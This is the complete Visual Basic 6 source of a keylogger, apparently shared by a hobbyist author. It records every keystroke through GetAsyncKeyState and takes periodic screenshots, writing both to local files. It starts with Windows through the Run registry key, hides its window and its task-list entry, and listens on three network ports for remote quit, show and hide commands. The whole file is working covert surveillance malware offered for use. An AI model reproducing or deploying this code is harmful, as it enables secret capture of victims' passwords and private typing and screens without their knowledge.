VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Keylogger 
   Caption         =   "Key Logger"
   ClientHeight    =   2880
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   4755
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   2880
   ScaleWidth      =   4755
   StartUpPosition =   3  'Windows Default
   Begin VB.CheckBox start 
      Caption         =   "Start With Windows"
      Height          =   255
      Left            =   2280
      TabIndex        =   6
      Top             =   2520
      Width           =   1935
   End
   Begin VB.TextBox interval 
      Height          =   285
      Left            =   2880
      TabIndex        =   4
      Top             =   2160
      Width           =   1695
   End
   Begin VB.CheckBox Check2 
      Caption         =   "Log Text"
      Height          =   255
      Left            =   240
      TabIndex        =   3
      Top             =   2520
      Width           =   1815
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Take Snapshots"
      Height          =   375
      Left            =   240
      TabIndex        =   2
      Top             =   2160
      Width           =   1695
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Left            =   6840
      Top             =   3360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer4 
      Interval        =   1000
      Left            =   7680
      Top             =   1320
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   6360
      Top             =   360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer TmrKey 
      Interval        =   1
      Left            =   6720
      Top             =   1440
   End
   Begin VB.TextBox TxtLog 
      Height          =   1365
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   480
      Width           =   4695
   End
   Begin MSWinsockLib.Winsock Winsock3 
      Left            =   7080
      Top             =   2400
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label1 
      Caption         =   "Interval:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   2160
      TabIndex        =   5
      Top             =   2160
      Width           =   735
   End
   Begin VB.Label Label2 
      Caption         =   "Last 100 Logged characters of text"
      Height          =   255
      Left            =   960
      TabIndex        =   1
      Top             =   120
      Width           =   2655
   End
End
Attribute VB_Name = "Keylogger"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Key logger, will log all keys on keyboard including shift key and symbols
'pressing F12 will make the form show/hide, can also connect to it on ports
'1230 = quit
'1231 = show
'1232 = hide
'you can remove the F12 part if you would rather connect to it using another program,
'i use a chat program that i wrote to do that
'uses registry to start w/ windows
'interval is how often it takes a screenshot in minutes
'Program by Andrew Parisio: Parisioa1@home.com
'www.geocities.com/wospter

Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Dim texts As String
Dim KeyASCII As Integer, Path As String
Option Explicit
Private Declare Sub keybd_event Lib "user32" _
                (ByVal bVk As Byte, _
                 ByVal bScan As Byte, _
                 ByVal dwFlags As Long, _
                 ByVal dwExtraInfo As Long)
Private Const VK_SNAPSHOT = &H2C
Const FullScreen = 1
Const AppScreen = 0
Dim num1 As Long
Dim Today As Variant, FileName As String
Public Sub takepic()
On Error Resume Next
If Len(TxtLog.Text) > 100 Then
If Check1 Then
Call keybd_event(VK_SNAPSHOT, FullScreen, 1, 1)
Today = Now
FileName = "\" + Format(Today, "mmddyy") & "_" & Format(Today, "h-m-s") & ".bmp"
SavePicture Clipboard.GetData, App.Path + FileName
End If
End If
If Len(TxtLog.Text) > 50 Then
If Check2 Then
Dim texts As String
    Open App.Path + "\log.txt" For Append As #1 'open the file
        Print #1, "===>" + Time + " - " + Date; TxtLog.Text 'print the time print the contents of the text box
        TxtLog.Text = ""
    Close #1 'close the file
End If
End If
End Sub
Private Sub Form_Unload(Cancel As Integer)
takepic
    Open App.Path + "\config.txt" For Output As #1 'open the file
        Write #1, Check1.Value
        Write #1, Check2.Value
        Print #1, interval
        Write #1, start.Value
    Close #1 'close the file
End Sub

Private Sub start_Click()
If start.Value = 1 Then
Call SetStringValue(HKEY_LOCAL_MACHINE, "Software\microsoft\windows\currentversion\run", "Key Logger", App.Path + "\" + App.EXEName + ".exe")
End If
If start.Value = 0 Then
Call DeleteStringValue(HKEY_LOCAL_MACHINE, "Software\microsoft\windows\currentversion\run", "Key Logger")
End If
End Sub

Private Sub Timer4_Timer()
On Error Resume Next
num1 = num1 + 1
If num1 Mod interval = 0 Then takepic
End Sub


Private Sub Form_Load()
On Error Resume Next
Dim Check1s As Integer, Check2s As Integer, intervals As Integer, load As Integer
    Open App.Path + "\config.txt" For Input As #1 'open the file
        Input #1, Check1s
        Input #1, Check2s
        Input #1, intervals
        Input #1, load
    Close #1 'close the file
    Check1.Value = Check1s
    Check2.Value = Check2s
    interval = intervals
    start.Value = load
        Winsock1.LocalPort = 1230
    Winsock2.LocalPort = 1231
    Winsock3.LocalPort = 1232
    Winsock1.Listen
    Winsock2.Listen
    Winsock3.Listen
    Me.Visible = False 'hide the form
    App.TaskVisible = False 'hide from ctrl-alt-del

End Sub

Private Sub TmrKey_Timer()
Dim Keycode As Integer, X As Integer, Shift As Integer

For Keycode = 8 To 255 'scan every key from #8-255
    X = GetAsyncKeyState(Keycode) 'get the state of the key

    If X = -32767 Then 'if the key is pressed, its value is -32767
        Select Case Keycode
            Case 8 'backspace
                If Len(TxtLog.Text) > 0 Then TxtLog.Text = Left$(TxtLog.Text, Len(TxtLog.Text) - 1)
            Case 9 'tab
                TxtLog.Text = TxtLog.Text + vbCrLf
                TxtLog.Text = TxtLog.Text + "[TAB]"
                TxtLog.Text = TxtLog.Text + vbCrLf
            Case 13 'enter
                TxtLog.Text = TxtLog.Text + vbCrLf
                TxtLog.Text = TxtLog.Text + "[ENTER]"
                TxtLog.Text = TxtLog.Text + vbCrLf
            Case 27 'escape
                TxtLog.Text = TxtLog.Text + vbCrLf
                TxtLog.Text = TxtLog.Text + "[ESC]"
                TxtLog.Text = TxtLog.Text + vbCrLf
            Case 32 'space
                TxtLog.Text = TxtLog.Text + " "
            Case 48 '0
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, ")", "0") 'Custom function exactly like the IIF function
            Case 49 '1
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "!", "1") 'Custom function exactly like the IIF function
            Case 50 '2
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "@", "2") 'Custom function exactly like the IIF function
            Case 51 '3
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "#", "3") 'Custom function exactly like the IIF function
            Case 52 '4
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "$", "4") 'Custom function exactly like the IIF function
            Case 53 '5
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "%", "5") 'Custom function exactly like the IIF function
            Case 54 '6
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "^", "6") 'Custom function exactly like the IIF function
            Case 55 '7
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "&", "7") 'Custom function exactly like the IIF function
            Case 56 '8
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "*", "8") 'Custom function exactly like the IIF function
            Case 57 '9
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "(", "9") 'Custom function exactly like the IIF function
            Case 65 To 90 'a-z
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, UCase$(Chr$(Keycode)), LCase$(Chr$(Keycode)))
            Case 112 To 123 'F1-F12
                TxtLog.Text = TxtLog.Text + vbCrLf
                TxtLog.Text = TxtLog.Text + "[F" + CStr(Keycode - 111) + "]" 'Case F1 to F12
                TxtLog.Text = TxtLog.Text + vbCrLf
                If Keycode - 111 = 12 Then
                    If Me.Visible = True Then
                    Me.Visible = False
                    Else: Me.Visible = True 'If user pressed F12, show the form
                    End If
                End If
            Case 186 ';
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, ":", ";") 'Custom function exactly like the IIF function
            Case 187 '=
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "+", "=") 'Custom function exactly like the IIF function
            Case 188 ',
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "<", ",") 'Custom function exactly like the IIF function
            Case 189 '-
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "_", "-") 'Custom function exactly like the IIF function
            Case 190 '.
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, ">", ".") 'Custom function exactly like the IIF function
            Case 191 '/
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "?", "/") 'Custom function exactly like the IIF function
            Case 192 '`
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "~", "`") 'Custom function exactly like the IIF function
            Case 219 '[
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "{", "[") 'Custom function exactly like the IIF function
            Case 220 '\
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "|", "\") 'Custom function exactly like the IIF function
            Case 221 ']
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, "}", "]") 'Custom function exactly like the IIF function
            Case 222 ''
                TxtLog.Text = TxtLog.Text + Shf(Shift = 1, Chr$(34), "'") 'Custom function exactly like the IIF function
        End Select
    End If
Next Keycode
    TxtLog.SelStart = Len(TxtLog.Text) 'scroll the text box down
End Sub
'CONNECT USiNG WINSOCK CONTROL ON RIHGT PORT AND IT WILL DO SOMETHING
Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
Unload Me
End Sub
Private Sub Winsock2_ConnectionRequest(ByVal requestID As Long)
Me.Visible = True
End Sub
Private Sub Winsock3_ConnectionRequest(ByVal requestID As Long)
Me.Visible = False
End Sub
